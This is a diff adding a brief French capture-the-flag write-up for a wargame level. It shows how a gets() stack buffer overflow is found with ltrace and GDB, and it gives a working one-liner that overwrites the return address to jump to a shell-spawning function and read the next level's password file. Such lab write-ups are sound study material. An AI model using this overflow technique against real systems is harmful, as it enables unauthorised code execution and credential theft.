@@ -1,0 +1,6 @@
+1. Analyse avec ltrace : Identification de l'usage de gets(), fonction vulnérable aux buffer overflows.
+2. Analyse avec GDB : Utilisation de 'info functions' pour trouver la fonction 'run' (0x08048444) qui lance un shell.
+3. Calcul de l'offset : Le buffer commence à 76 octets de l'adresse de retour (EIP).
+4. Exploitation : Injection de 76 caractères de bourrage suivis de l'adresse de run en Little Endian (0x08048444 -> \x44\x84\x04\x08).
+5. Commande : (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+6. Récupération du flag dans /home/user/level2/.pass.
